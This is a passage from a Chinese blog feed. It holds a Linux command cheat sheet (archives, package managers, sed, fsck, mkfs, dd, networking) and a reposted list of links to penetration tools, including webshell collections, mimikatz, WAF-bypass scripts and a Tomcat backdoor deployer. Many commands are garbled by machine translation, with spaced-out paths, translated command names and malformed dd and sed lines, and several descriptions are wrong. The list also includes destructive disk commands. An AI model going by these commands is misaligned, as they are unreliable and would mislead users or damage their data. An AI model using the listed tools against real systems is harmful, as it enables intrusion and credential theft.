file1只允许以追加方式读写文件</p><p>chattr + c file1允许这个文件能被内核自动压缩/解压</p><p>chattr + d file1在进行文件系统备份时，dump程序将忽略这个文件</p><p>chattr + i file1设置成不可变的文件，不能被删除，修改，重命名或者链接</p><p>chattr + s file1允许一个文件被安全地删除</p><p>chattr + S file1一旦应用程序对这个文件执行了写操作，使系统立刻把修改的结果写到磁盘</p><p>chattr + u file1若文件被删除，系统会允许你在以后恢复这个被删除的文件</p><p>lsattr显示特殊的属性</p><h1 id="0x07-打包和压缩文件"><a href="#0x07-打包和压缩文件" class="headerlink" title="0x07 打包和压缩文件"></a>0x07 打包和压缩文件</h1><p>bunzip2 file1.bz2解压一个叫做’file1.bz2’的文件</p><p>bzip2 file1压缩一个叫做’file1’的文件</p><p>gunzip file1.gz解压一个叫做’file1.gz’的文件</p><p>gzip file1压缩一个叫做’file1’的文件</p><p>gzip -9 file1最大程度压缩</p><p>rar a file1.rar test_file创建一个叫做’file1.rar’的包</p><p>rar a file1.rar file1 file2 dir1同时压缩’file1’，’file2’以及目录’dir1’</p><p>rar x file1.rar解压rar包</p><p>unrar x file1.rar解压rar包</p><p>tar -cvf archive.tar file1创建一个非压缩的tarball</p><p>tar -cvf archive.tar file1 file2 dir1创建一个包含了’file1’，’file2’以及’dir1’的档案文件</p><p>tar -tf archive.tar显示一个包中的内容</p><p>tar -xvf archive.tar释放一个包</p><p>tar -xvf archive.tar -C / tmp将压缩包释放到/ tmp目录下</p><p>tar -cvfj archive.tar.bz2 dir1创建一个bzip2格式的压缩包</p><p>tar -xvfj archive.tar.bz2解压一个bzip2格式的压缩包</p><p>tar -cvfz archive.tar.gz dir1创建一个gzip格式的压缩包</p><p>tar -xvfz archive.tar.gz解压一个gzip格式的压缩包</p><p>zip file1.zip file1创建一个zip格式的压缩包</p><p>zip -r file1.zip file1 file2 dir1将几个文件和目录同时压缩成一个zip格式的压缩包</p><p>unzip<br>file1.zip解压一个zip格式压缩包</p><h1 id="0x08-RPM包-（Fedora，Redhat及类似系统）"><a href="#0x08-RPM包-（Fedora，Redhat及类似系统）" class="headerlink" title="0x08 RPM包 - （Fedora，Redhat及类似系统）"></a>0x08 RPM包 - （Fedora，Redhat及类似系统）</h1><p>rpm -ivh package.rpm安装一个rpm包</p><p>rpm -ivh –nodeeps package.rpm安装一个rpm包而忽略依赖关系警告</p><p>rpm -U package.rpm更新一个rpm包但不改变其配置文件</p><p>rpm -F package.rpm更新一个确定已经安装的rpm包</p><p>rpm -e package_name.rpm删除一个rpm包</p><p>rpm -qa显示系统中所有已经安装的rpm包</p><p>rpm -qa | grep httpd显示所有名称中包含“httpd”字样的rpm包</p><p>rpm -qi package_name获取一个已安装包的特殊信息</p><p>rpm -qg“System Environment / Daemons”显示一个组件的rpm包</p><p>rpm -ql package_name显示一个已经安装的rpm包提供的文件列表</p><p>rpm -qc package_name显示一个已经安装的rpm包提供的配置文件列表</p><p>rpm -q package_name –whatrequires显示与一个rpm包存在依赖关系的列表</p><p>rpm -q package_name –whatprovides显示一个rpm包所占的体积</p><p>rpm -q package_name –scripts显示在安装/删除期间所执行的脚本l</p><p>rpm -q package_name –changelog显示一个rpm包的修改历史</p><p>rpm -qf /etc/httpd/conf/httpd.conf确认所给的文件由哪个rpm包所提供</p><p>rpm -qp package.rpm -l显示由一个尚未安装的rpm包提供的文件列表</p><p>rpm –import / media / cdrom / RPM-GPG-KEY导入公司数字证书</p><p>rpm –checksig package.rpm确认一个rpm包的完整性</p><p>rpm -qa gpg-pubkey确认已安装的所有rpm包的完整性</p><p>rpm -V package_name检查文件尺寸，许可，类型，所有者，群组，MD5检查以及最后修改时间</p><p>rpm -Va检查系统中所有已安装的rpm包 - 小心使用</p><p>rpm -Vp package.rpm确认一个rpm包还未安装</p><p>rpm2cpio package.rpm | cpio –extract –make-directories * bin *从一个rpm包运行可执行文件</p><p>rpm -ivh /usr/src/redhat/RPMS/<code>arch</code>/package.rpm从一个rpm源码安装一个构建好的包</p><p>rpmbuild –rebuild package_name.src.rpm从一个rpm源码构建一个rpm包</p><h1 id="0x09-YUM软件包升级器-（Fedora，RedHat及类似系统）"><a href="#0x09-YUM软件包升级器-（Fedora，RedHat及类似系统）" class="headerlink" title="0x09 YUM软件包升级器 - （Fedora，RedHat及类似系统）"></a>0x09 YUM软件包升级器 - （Fedora，RedHat及类似系统）</h1><p>yum install package_name下载并安装一个rpm包</p><p>yum localinstall package_name.rpm将安装一个rpm包，使用你自己的软件仓库为你解决所有依赖关系</p><p>yum update package_name.rpm更新当前系统中所有安装的rpm包</p><p>yum update package_name更新一个rpm包</p><p>yum remove package_name删除一个rpm包</p><p>yum list列出当前系统中安装的所有包</p><p>yum search package_name在rpm仓库中搜寻软件包</p><p>yum clean packages清理rpm缓存删除下载的包</p><p>yum clean headers删除所有头文件</p><p>yum clean all删除所有缓存的包和头文件</p><h1 id="0x10-DEB包（Debian，Ubuntu以及类似系统）"><a href="#0x10-DEB包（Debian，Ubuntu以及类似系统）" class="headerlink" title="0x10 DEB包（Debian，Ubuntu以及类似系统）"></a>0x10 DEB包（Debian，Ubuntu以及类似系统）</h1><p>dpkg -i package.deb安装/更新一个deb包</p><p>dpkg -r package_name从系统删除一个deb包</p><p>dpkg -l显示系统中所有已经安装的deb包</p><p>dpkg -l | grep httpd显示所有名称中包含“httpd”字样的deb包</p><p>dpkg -s package_name获得已经安装在系统中一个特殊包的信息</p><p>dpkg -L package_name显示系统中已经安装的一个deb包所提供的文件列表</p><p>dpkg –contents package.deb显示尚未安装的一个包所提供的文件列表</p><p>dpkg -S / bin / ping确认所给的文件由哪个deb包提供</p><h1 id="0x11-APT软件工具（Debian，Ubuntu以及类似系统）"><a href="#0x11-APT软件工具（Debian，Ubuntu以及类似系统）" class="headerlink" title="0x11 APT软件工具（Debian，Ubuntu以及类似系统）"></a>0x11 APT软件工具（Debian，Ubuntu以及类似系统）</h1><p>apt-get install package_name安装/更新一个deb包</p><p>apt-cdrom install package_name从光盘安装/更新一个deb包</p><p>apt-get update升级列表中的软件包</p><p>apt-get upgrade升级所有已安装的软件</p><p>apt-get remove package_name从系统删除一个deb包</p><p>apt-get check确认依赖的软件仓库正确</p><p>apt-get clean从下载的软件包中清理缓存</p><p>apt-cache search search-package返回包含所要搜索字符串的软件包名称</p><h1 id="0x12-查看文件内容"><a href="#0x12-查看文件内容" class="headerlink" title="0x12 查看文件内容"></a>0x12 查看文件内容</h1><p>cat file1从第一个字节开始正向查看文件的内容</p><p>tac file1从最后一行开始反向查看一个文件的内容</p><p>更多file1查看一个长文件的内容</p><p>less file1类似于’more’命令，但是它允许在文件中和正向操作一样的反向操作</p><p>head -2 file1查看一个文件的前两行</p><p>tail -2 file1查看一个文件的最后两行</p><p>tail -f / var / log / messages实时查看被添加到一个文件中的内容</p><h1 id="0x13-文本处理"><a href="#0x13-文本处理" class="headerlink" title="0x13 文本处理"></a>0x13 文本处理</h1><p>cat file1 file2 … | command &lt;&gt; file1_in.txt_or_file1_out.txt使用PIPE，STDIN和STDOUT进行文本操作的一般语法</p><p>cat file1 | 命令（sed，grep，awk，grep等等）&gt; result.txt合并一个文件的详细说明文本，并将简介写入一个新文件中</p><p>cat file1 | 命令（sed，grep，awk，grep等等）&gt;&gt; result.txt合并一个文件的详细说明文本，并将简介写入一个已有的文件中</p><p>grep Aug / var / log / messages在文件’/ var / log / messages’中查找关键词“Aug”</p><p>grep ^ Aug / var / log / messages在文件’/ var / log / messages’中查找以“Aug”开始的词汇</p><p>grep [0-9] / var / log / messages选择’/ var / log / messages’文件中所有包含数字的行</p><p>grep Aug -R / var / log / *在目录’/ var / log’及随后的目录中搜索字符串“Aug”</p><p>sed’s / stringa1 / stringa2 / g’example.txt将example.txt文件中的“string1”替换成“string2”</p><p>sed’/ ^ $ / d’example.txt从example.txt文件中删除所有空白行</p><p>sed’/ *＃/ d; / ^ $ / d’example.txt从example.txt文件中删除所有注释和空白行</p><p>echo’esempio’| tr’[：lower：]’’[：upper：]’合并上下单元格内容</p><p>sed -e’1d’rend.txt从文件example.txt中排除第一行</p><p>sed -n’/ stringa1 / p’查看只包含词汇“string1”的行</p><p>sed -e’s / * $ //‘example.txt删除每一行最后的空白字符</p><p>sed -e’s / stringa1 // g’example.txt从文档中只删除词汇“string1”并保留剩余全部</p><p>sed -n’1,5p; 5q’example.txt查看从第一行到第5行内容</p><p>sed -n’5p; 5q’example.txt查看第5行</p><p>sed -e’s / 00 * / 0 / g’example.txt用单个零替换多个零</p><p>cat -n file1标示文件的行数</p><p>cat example.txt | awk’NR％2 == 1’删除example.txt文件中的所有偶数行</p><p>echo abc | awk’{print $ 1}’查看一行第一栏</p><p>echo abc | awk’{print $ 1，$ 3}’查看一行的第一和第三栏</p><p>paste file1 file2合并两个文件或两栏的内容</p><p>paste -d’+’file1 file2合并两个文件或两栏的内容，中间用“+”区分</p><p>sort file1 file2排序两个文件的内容</p><p>sort file1 file2 | uniq取出两个文件的并集（重复的行只保留一份）</p><p>sort file1 file2 | uniq -u删除交集，留下其他的行</p><p>sort file1 file2 | uniq -d取出两个文件的交集（只留下同时存在于两个文件中的文件）</p><p>comm -1 file1 file2比较两个文件的内容只删除’file1’所包含的内容</p><p>comm -2 file1 file2比较两个文件的内容只删除’file2’所包含的内容</p><p>comm -3 file1 file2比较两个文件的内容只删除两个文件共有的部分</p><h1 id="0x14-字符设置和文件格式转换"><a href="#0x14-字符设置和文件格式转换" class="headerlink" title="0x14 字符设置和文件格式转换"></a>0x14 字符设置和文件格式转换</h1><p>dos2unix filedos.txt fileunix.txt将一个文本文件的格式从MSDOS转换成UNIX</p><p>unix2dos fileunix.txt filedos.txt将一个文本文件的格式从UNIX转换成MSDOS</p><p>recode ..HTML &lt;page.txt&gt; page.html将一个文本文件转换成html</p><p>recode -l | 更多显示所有允许的转换格式</p><h1 id="0x15-文件系统分析"><a href="#0x15-文件系统分析" class="headerlink" title="0x15 文件系统分析"></a>0x15 <strong>文件系统分析</strong></h1><p>badblocks -v / dev / hda1检查磁盘hda1上的坏磁块</p><p>fsck / dev / hda1修复/检查hda1磁盘上linux文件系统的完整性</p><p>fsck.ext2 / dev / hda1修复/检查hda1磁盘上ext2文件系统的完整性</p><p>e2fsck / dev / hda1修复/检查hda1磁盘上ext2文件系统的完整性</p><p>e2fsck -j / dev / hda1修复/检查hda1磁盘上ext3文件系统的完整性</p><p>fsck.ext3 / dev / hda1修复/检查hda1磁盘上ext3文件系统的完整性</p><p>fsck.vfat / dev / hda1修复/检查hda1磁盘上fat文件系统的完整性</p><p>fsck.msdos / dev / hda1修复/检查hda1磁盘上dos文件系统的完整性</p><p>dosfsck / dev / hda1修复/检查hda1磁盘上dos文件系统的完整性</p><h1 id="0x16-初始化一个文件系统"><a href="#0x16-初始化一个文件系统" class="headerlink" title="0x16 初始化一个文件系统"></a>0x16 <strong>初始化一个文件系统</strong></h1><p>mkfs / dev / hda1在hda1分区创建一个文件系统</p><p>mke2fs / dev / hda1在hda1分区创建一个linux ext2的文件系统</p><p>mke2fs -j / dev / hda1在hda1分区创建一个linux ext3（日志型）的文件系统</p><p>mkfs -t vfat 32 -F / dev / hda1创建一个FAT32文件系统</p><p>fdformat -n / dev / fd0格式化一个软盘</p><p>mkswap / dev / hda3创建一个swap文件系统</p><p>返回顶部索引^</p><p>SWAP文件系统</p><p>mkswap / dev / hda3创建一个swap文件系统</p><p>swapon / dev / hda3启用一个新的swap文件系统</p><p>swapon / dev / hda2 / dev / hdb3启用两个交换分区</p><h1 id="0x17-备份"><a href="#0x17-备份" class="headerlink" title="0x17 备份"></a>0x17 <strong>备份</strong></h1><p>dump -0aj -f /tmp/home0.bak / home制作一个’/ home’目录的完整备份</p><p>dump -1aj -f /tmp/home0.bak / home制作一个’/ home’目录的交互式备份</p><p>恢复-if /tmp/home0.bak还原一个交互式备份</p><p>rsync -rogpav –delete / home / tmp同步两边的目录</p><p>rsync -rogpav -e ssh –delete / home ip_address：/ tmp通过SSH通道rsync</p><p>rsync -az -e ssh –delete ip_addr：/ home / public / home / local通过ssh和压缩将一个远程目录同步到本地目录</p><p>rsync -az -e ssh –delete / home / local ip_addr：/ home / public通过ssh和压缩将本地目录同步到远程目录</p><p>dd bs = 1M if = / dev / hda | gzip | ssh user @ ip_addr’dd of = hda.gz’通过ssh在远程主机上执行一次备份本地磁盘的操作</p><p>dd if = / dev / sda = / tmp / file1备份磁盘内容到一个文件</p><p>tar -Puf backup.tar / home / user执行一次对’/ home / user’目录的交互式备份操作</p><p>（cd / tmp / local / &amp;&amp; tar c。）| ssh -C user @ ip_addr’cd / home / share / &amp;&amp; tar x -p’通过ssh在远程目录中复制一个目录内容</p><p>（tar c / home）| ssh -C user @ ip_addr’cd / home / backup-home &amp;&amp; tar x -p’通过ssh在远程目录中复制一个本地目录</p><p>tar cf - 。| （cd / tmp / backup; tar xf - ）本地将一个目录复制到另一个地方，保留原有权限及链接</p><p>find / home / user1 -name’* .txt’| xargs cp -av –target-directory = / home / backup / –parents从一个目录查找并复制所有以’.txt’结尾的文件到另一个目录</p><p>find / var / log -name’* .log’| tar cv –files-from = - | bzip2&gt; log.tar.bz2查找所有以’.log’结尾的文件并做成一个bzip包</p><p>dd if = / dev / hda of = / dev / fd0 bs = 512 count = 1做一个将MBR（Master Boot Record）内容复制到软盘的动作</p><p>dd if = / dev / fd0 of = / dev / hda bs = 512 count = 1从已经保存到软盘的备份中恢复MBR内容</p><h1 id="0x18-光盘"><a href="#0x18-光盘" class="headerlink" title="0x18 光盘"></a>0x18 <strong>光盘</strong></h1><p>cdrecord -v gracetime = 2 dev = / dev / cdrom -eject blank = fast -force清空一个可复写的光盘内容</p><p>mkisofs / dev / cdrom&gt; cd.iso在磁盘上创建一个光盘的iso镜像文件</p><p>mkisofs / dev / cdrom | gzip&gt; cd_iso.gz在磁盘上创建一个压缩了的光盘iso镜像文件</p><p>mkisofs -J -allow-leading-dots -R -V“Label CD”-iso-level 4 -o ./cd.iso data_cd创建一个目录的iso镜像文件</p><p>cdrecord -v dev = / dev / cdrom cd.iso刻录一个ISO镜像文件</p><p>gzip -dc cd_iso.gz | cdrecord dev = / dev / cdrom - 刻录一个压缩了的ISO镜像文件</p><p>mount -o loop cd.iso / mnt / iso挂载一个ISO镜像文件</p><p>cd-paranoia -B从一个CD光盘转录音轨到wav文件中</p><p>cd-paranoia - “-3”从一个CD光盘转录音轨到wav文件中（参数-3）</p><p>cdrecord –scanbus扫描总线以识别scsi通道</p><p>dd if = / dev / hdc | md5sum校验一个设备的md5sum编码，例如一张CD</p><h1 id="0x19-网络-（以太网和WIFI无线）"><a href="#0x19-网络-（以太网和WIFI无线）" class="headerlink" title="0x19 网络 - （以太网和WIFI无线）"></a>0x19 <strong>网络 - （以太网和WIFI无线）</strong></h1><p>ifconfig eth0显示一个以太网卡的配置</p><p>ifup eth0启用一个’eth0’网络设备</p><p>ifdown eth0禁用一个’eth0’网络设备</p><p>ifconfig eth0 192.168.1.1 netmask 255.255.255.0控制IP地址</p><p>ifconfig eth0 promisc设置’eth0’成混杂模式以嗅探数据包（sniffing）</p><p>dhclient eth0以dhcp模式启用’eth0’</p><p>route -n show routing table</p><p>route add -net 0/0 gw IP_Gateway configura默认网关</p><p>route add -net 192.168.0.0 netmask 255.255.0.0 gw 192.168.1.1配置静态路由到达网络’192.168.0.0/16’</p><p>route del 0/0 gw IP_gateway删除静态路由</p><p>echo“1”&gt; / proc / sys / net / ipv4 / ip_forward激活ip routing</p><p>hostname显示系统的主机名</p><p>主机<a href="http://www.example.com查找主机名将名称解析为IP地址，反之亦然（1）" target="_blank" rel="noopener">www.example.com查找主机名将名称解析为IP地址，反之亦然（1）</a></p><p>nslookup <a href="http://www.example.com查找主机名将名称解析为ip地址，反之亦然（2）" target="_blank" rel="noopener">www.example.com查找主机名将名称解析为ip地址，反之亦然（2）</a></p><p>ip link show显示所有接口的链接状态</p><p>mii-tool eth0显示’eth0’的链接状态</p><p>ethtool eth0显示网卡’eth0’的统计信息</p><p>netstat -tup显示所有活动网络连接及其PID</p><p>netstat -tupl显示监听系统及其PID的所有网络服务</p><p>tcpdump tcp端口80显示所有HTTP流量</p><p>iwlist扫描显示无线网络</p><p>iwconfig eth1显示无线网卡的配置</p><p>主机名显示主机名</p><p>托管<a href="http://www.example.com查找主机名，将名称解析为ip地址，反之亦然" target="_blank" rel="noopener">www.example.com查找主机名，将名称解析为ip地址，反之亦然</a></p><p>nslookup <a href="http://www.example.com查找主机名将名称解析为ip地址，反之亦然" target="_blank" rel="noopener">www.example.com查找主机名将名称解析为ip地址，反之亦然</a></p><p>whois <a href="http://www.example.com查找Whois数据库" target="_blank" rel="noopener">www.example.com查找Whois数据库</a></p><p>GO TOP INDEX ^</p><p>Microsoft Windows网络（SAMBA）</p><p>nbtscan ip_addr netbios名称解析</p><p>nmblookup -A ip_addr netbios名称解析</p><p>smbclient -L ip_addr / hostname显示Windows主机的远程共享</p><p>smbget -Rr smb：// ip_addr / share像wget可以通过smb从主机窗口下载文件</p><p>mount -t smbfs -o username = user，password = pass // WinClient / share / mnt / share挂载一个windows网络共享</p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;本文涵盖了Linux系统的很多命令，为了方便以后查找使用，在这里记录一下。&lt;/p&gt;
&lt;p&gt;内容均从网上摘抄。&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="https://www.mad-coding.cn/categories/Linux/"/>
    
    
      <category term="命令" scheme="https://www.mad-coding.cn/tags/%E5%91%BD%E4%BB%A4/"/>
    
      <category term="Linux" scheme="https://www.mad-coding.cn/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试工具库</title>
    <link href="https://www.mad-coding.cn/2019/08/26/Python%E5%B7%A5%E5%85%B7%E5%BA%93/"/>
    <id>https://www.mad-coding.cn/2019/08/26/Python工具库/</id>
    <published>2019-08-26T02:34:58.000Z</published>
    <updated>2019-08-27T13:27:45.118Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>我们咋进行渗透测试的过程中，可能会用到很多的开源测试工具，但是一个个去寻找太过于繁琐了，索性tools论文中给我们整理好了，这里转载一下，也方便自己查看。</p><p>转载链接：<a href="https://www.t00ls.net/pytools.html" target="_blank" rel="noopener">https://www.t00ls.net/pytools.html</a></p><a id="more"></a><h1 id="0x01-漏洞及渗透练习平台"><a href="#0x01-漏洞及渗透练习平台" class="headerlink" title="0x01 漏洞及渗透练习平台"></a>0x01 漏洞及渗透练习平台</h1><p>WebGoat漏洞练习平台：</p><p><a href="https://github.com/WebGoat/WebGoat" target="_blank" rel="noopener">https://github.com/WebGoat/WebGoat</a></p><p>webgoat-legacy漏洞练习平台:</p><p><a href="https://github.com/WebGoat/WebGoat-Legacy" target="_blank" rel="noopener">https://github.com/WebGoat/WebGoat-Legacy</a></p><p>zvuldirll漏洞练习平台：</p><p><a href="https://github.com/710leo/ZVulDrill" target="_blank" rel="noopener">https://github.com/710leo/ZVulDrill</a></p><p>vulapps漏洞练习平台：</p><p><a href="https://github.com/Medicean/VulApps" target="_blank" rel="noopener">https://github.com/Medicean/VulApps</a></p><p>dvwa漏洞练习平台：</p><p><a href="https://github.com/RandomStorm/DVWA" target="_blank" rel="noopener">https://github.com/RandomStorm/DVWA</a></p><p>数据库注入练习平台 ：</p><p><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">https://github.com/Audi-1/sqli-labs</a></p><p>用node编写的漏洞练习平台，like OWASP Node Goat：</p><p><a href="https://github.com/cr0hn/vulnerable-node" target="_blank" rel="noopener">https://github.com/cr0hn/vulnerable-node</a></p><p>Ruby编写的一款工具，生成含漏洞的虚拟机：</p><p><a href="https://github.com/cliffe/secgen" target="_blank" rel="noopener">https://github.com/cliffe/secgen</a></p><h1 id="0x02-花式扫描器"><a href="#0x02-花式扫描器" class="headerlink" title="0x02 花式扫描器"></a>0x02 花式扫描器</h1><p>Nmap端口扫描器：</p><p><a href="https://github.com/nmap/nmap" target="_blank" rel="noopener">https://github.com/nmap/nmap</a></p><p>本地网络扫描器：</p><p><a href="https://github.com/SkyLined/LocalNetworkScanner" target="_blank" rel="noopener">https://github.com/SkyLined/LocalNetworkScanner</a></p><p>子域名扫描器：</p><p><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a></p><p><a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/Sublist3r</a></p><p><a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">https://github.com/TheRook/subbrute</a></p><p><a href="https://github.com/infosec-au/altdns" target="_blank" rel="noopener">https://github.com/infosec-au/altdns</a></p><p>linux漏洞扫描：</p><p><a href="https://github.com/future-architect/vuls" target="_blank" rel="noopener">https://github.com/future-architect/vuls</a></p><p>基于端口扫描以及关联CVE:</p><p><a href="https://github.com/m0nad/HellRaiser" target="_blank" rel="noopener">https://github.com/m0nad/HellRaiser</a></p><p>漏洞路由扫描器：</p><p><a href="https://github.com/jh00nbr/Routerhunter-2.0" target="_blank" rel="noopener">https://github.com/jh00nbr/Routerhunter-2.0</a></p><p>迷你批量信息泄漏扫描脚本：</p><p><a href="https://github.com/lijiejie/BBScan" target="_blank" rel="noopener">https://github.com/lijiejie/BBScan</a></p><p>Waf类型检测工具：</p><p><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a></p><p>服务器端口弱口令扫描器：</p><p><a href="https://github.com/wilson9x1/fenghuangscanner_v3" target="_blank" rel="noopener">https://github.com/wilson9x1/fenghuangscanner_v3</a></p><p>Fox-scan扫描器：</p><p><a href="https://github.com/fengxuangit/Fox-scan/" target="_blank" rel="noopener">https://github.com/fengxuangit/Fox-scan/</a></p><h1 id="0x03-信息搜集工具"><a href="#0x03-信息搜集工具" class="headerlink" title="0x03 信息搜集工具"></a>0x03 信息搜集工具</h1><p>社工收集器：</p><p><a href="https://github.com/n0tr00t/Sreg" target="_blank" rel="noopener">https://github.com/n0tr00t/Sreg</a></p><p>Github信息搜集：</p><p><a href="https://github.com/sea-god/gitscan" target="_blank" rel="noopener">https://github.com/sea-god/gitscan</a></p><p>github Repo信息搜集工具：</p><p><a href="https://github.com/metac0rtex/GitHarvester" target="_blank" rel="noopener">https://github.com/metac0rtex/GitHarvester</a></p><p>信息探测及扫描工具：</p><p><a href="https://github.com/darryllane/Bluto" target="_blank" rel="noopener">https://github.com/darryllane/Bluto</a></p><p>内部网络信息扫描器：</p><p><a href="https://github.com/sowish/LNScan" target="_blank" rel="noopener">https://github.com/sowish/LNScan</a></p><p>远程桌面登录扫描器：</p><p><a href="https://github.com/linuz/Sticky-Keys-Slayer" target="_blank" rel="noopener">https://github.com/linuz/Sticky-Keys-Slayer</a></p><p>网络基础设施渗透工具</p><p><a href="https://github.com/SECFORCE/sparta" target="_blank" rel="noopener">https://github.com/SECFORCE/sparta</a></p><p>SNMAP密码破解:</p><p><a href="https://github.com/SECFORCE/SNMP-Brute" target="_blank" rel="noopener">https://github.com/SECFORCE/SNMP-Brute</a></p><h1 id="0x04-WEB"><a href="#0x04-WEB" class="headerlink" title="0x04 WEB"></a>0x04 WEB</h1><p>webshell大合集：</p><p><a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a></p><p>渗透以及web攻击脚本：</p><p><a href="https://github.com/brianwrf/hackUtils" target="_blank" rel="noopener">https://github.com/brianwrf/hackUtils</a></p><p>web渗透小工具大合集：</p><p><a href="https://github.com/rootphantomer/hack_tools_for_me" target="_blank" rel="noopener">https://github.com/rootphantomer/hack<em>tools</em>for_me</a></p><p>XSS数据接收平台：</p><p><a href="https://github.com/firesunCN/BlueLotus_XSSReceiver" target="_blank" rel="noopener">https://github.com/firesunCN/BlueLotus_XSSReceiver</a></p><p>XSS与CSRF工具：</p><p><a href="https://github.com/evilcos/xssor" target="_blank" rel="noopener">https://github.com/evilcos/xssor</a></p><p>xss多功能扫描器：</p><p><a href="https://github.com/shawarkhanethicalhacker/BruteXSS" target="_blank" rel="noopener">https://github.com/shawarkhanethicalhacker/BruteXSS</a></p><p>web漏洞扫描器:</p><p><a href="https://github.com/andresriancho/w3af" target="_blank" rel="noopener">https://github.com/andresriancho/w3af</a></p><p>WEB漏洞扫描器：</p><p><a href="https://github.com/sullo/nikto" target="_blank" rel="noopener">https://github.com/sullo/nikto</a></p><p>渗透常用小工具包：</p><p><a href="https://github.com/leonteale/pentestpackage" target="_blank" rel="noopener">https://github.com/leonteale/pentestpackage</a></p><p>web目录扫描器:</p><p><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></p><p>web向命令注入检测工具：</p><p><a href="https://github.com/stasinopoulos/commix" target="_blank" rel="noopener">https://github.com/stasinopoulos/commix</a></p><p>自动化SQL注入检查工具：</p><p><a href="https://github.com/epinna/tplmap" target="_blank" rel="noopener">https://github.com/epinna/tplmap</a></p><p>SSL扫描器：</p><p><a href="https://github.com/rbsec/sslscan" target="_blank" rel="noopener">https://github.com/rbsec/sslscan</a></p><p>安全工具集合：</p><p><a href="https://github.com/codejanus/ToolSuite" target="_blank" rel="noopener">https://github.com/codejanus/ToolSuite</a></p><p>apache日志分析器：</p><p><a href="https://github.com/mthbernardes/ARTLAS" target="_blank" rel="noopener">https://github.com/mthbernardes/ARTLAS</a></p><p>php代码审计工具：</p><p><a href="https://github.com/pwnsdx/BadCode" target="_blank" rel="noopener">https://github.com/pwnsdx/BadCode</a></p><p>web指纹识别扫描：</p><p><a href="https://github.com/urbanadventurer/whatweb" target="_blank" rel="noopener">https://github.com/urbanadventurer/whatweb</a></p><p>检查网站恶意攻击：</p><p><a href="https://github.com/ciscocsirt/malspider" target="_blank" rel="noopener">https://github.com/ciscocsirt/malspider</a></p><p>wordprees漏洞扫描器：</p><p><a href="https://github.com/wpscanteam/wpscan" target="_blank" rel="noopener">https://github.com/wpscanteam/wpscan</a></p><p>固件漏洞扫描器：</p><p><a href="https://github.com/misterch0c/firminator_backend" target="_blank" rel="noopener">https://github.com/misterch0c/firminator_backend</a></p><p>数据库注入工具</p><p><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener">https://github.com/sqlmapproject/sqlmap</a></p><p>Web代理：</p><p><a href="https://github.com/zt2/sqli-hunter" target="_blank" rel="noopener">https://github.com/zt2/sqli-hunter</a></p><p>新版中国菜刀：</p><p><a href="https://github.com/Chora10/Cknife" target="_blank" rel="noopener">https://github.com/Chora10/Cknife</a></p><p>git泄露利用EXP：</p><p><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a></p><p>浏览器攻击框架：</p><p><a href="https://github.com/beefproject/beef" target="_blank" rel="noopener">https://github.com/beefproject/beef</a></p><p>自动化绕过WAF脚本：</p><p><a href="https://github.com/khalilbijjou/WAFNinja" target="_blank" rel="noopener">https://github.com/khalilbijjou/WAFNinja</a></p><p><a href="https://github.com/owtf/wafbypasser" target="_blank" rel="noopener">https://github.com/owtf/wafbypasser</a></p><p>一款开源WAF：</p><p><a href="https://github.com/SpiderLabs/ModSecurity" target="_blank" rel="noopener">https://github.com/SpiderLabs/ModSecurity</a></p><p>http命令行客户端：</p><p><a href="https://github.com/jkbrzt/httpie" target="_blank" rel="noopener">https://github.com/jkbrzt/httpie</a></p><p>浏览器调试利器：</p><p><a href="https://github.com/firebug/firebug" target="_blank" rel="noopener">https://github.com/firebug/firebug</a></p><p>DISCUZ漏洞扫描器：</p><p><a href="https://github.com/code-scan/dzscan" target="_blank" rel="noopener">https://github.com/code-scan/dzscan</a></p><p>自动化代码审计工具</p><p><a href="https://github.com/wufeifei/cobra" target="_blank" rel="noopener">https://github.com/wufeifei/cobra</a></p><p>浏览器攻击框架：</p><p><a href="https://github.com/julienbedard/browsersploit" target="_blank" rel="noopener">https://github.com/julienbedard/browsersploit</a></p><p>tomcat自动后门部署：</p><p><a href="https://github.com/mgeeky/tomcatWarDeployer" target="_blank" rel="noopener">https://github.com/mgeeky/tomcatWarDeployer</a></p><p>网络空间指纹扫描器：</p><p><a href="https://github.com/nanshihui/Scan-T" target="_blank" rel="noopener">https://github.com/nanshihui/Scan-T</a></p><p>burpsuit之J2EE扫描插件：</p><p><a href="https://github.com/ilmila/J2EEScan" target="_blank" rel="noopener">https://github.com/ilmila/J2EEScan</a></p><h1 id="0x05-windows域渗透工具"><a href="#0x05-windows域渗透工具" class="headerlink" title="0x05  windows域渗透工具"></a>0x05  windows域渗透工具</h1><p>mimikatz明文注入：</p><p><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz</a></p><p>Powershell渗透库合集：</p><p><a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit</a></p><p>Powershell tools合集：</p><p><a href="https://github.com/clymb3r/PowerShell" target="_blank" rel="noopener">https://github.com/clymb3r/PowerShell</a></p><p>powershell的mimikittenz:</p><p><a href="https://github.com/putterpanda/mimikittenz" target="_blank" rel="noopener">https://github.com/putterpanda/mimikittenz</a></p><p>域渗透教程:</p><p><a href="https://github.com/l3m0n/pentest_study" target="_blank" rel="noopener">https://github.com/l3m0n/pentest_study</a></p><h1 id="0x06-Fuzz"><a href="#0x06-Fuzz" class="headerlink" 